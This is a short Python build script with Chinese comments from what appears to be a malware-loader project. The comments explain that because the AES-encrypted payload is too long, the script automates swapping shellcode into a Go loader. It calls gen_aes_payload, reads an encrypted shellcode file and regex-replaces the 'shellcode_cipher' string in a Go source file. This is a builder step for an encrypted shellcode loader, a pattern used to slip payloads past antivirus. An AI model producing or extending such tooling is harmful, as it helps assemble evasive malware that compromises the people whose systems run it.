import re
from step1 import gen_aes_payload
from loguru import logger
from common.project_path import project_path

"""
供go语言使用
因为加密后的payload过长，所以需要自动化替换加载器中的shellcode
"""

logger.info("start")

def main():
    with open("C:\\Users\\tttkkk\\go\\src\\awesomeProject2\\test2.go", "r+", encoding="utf-8") as f1:
        with open( project_path.get_project_path() + "./resource/shellcode_cipher.tmp", "rb") as f2:
            step2 = f1.read()
            # print(step2)
            shellcode_cipher = f2.read()
            new_string = re.sub(r'shellcode_cipher := "(.*?)"', "shellcode_cipher := \"" + shellcode_cipher.decode() + '"' ,  step2)
            # print(shellcode_cipher.decode())
            print(new_string)
            # print(f1)
            f1.seek(0, 0)
            f1.write(new_string)
            logger.info("payload生成成功")




if __name__ == '__main__':
    gen_aes_payload()
    main()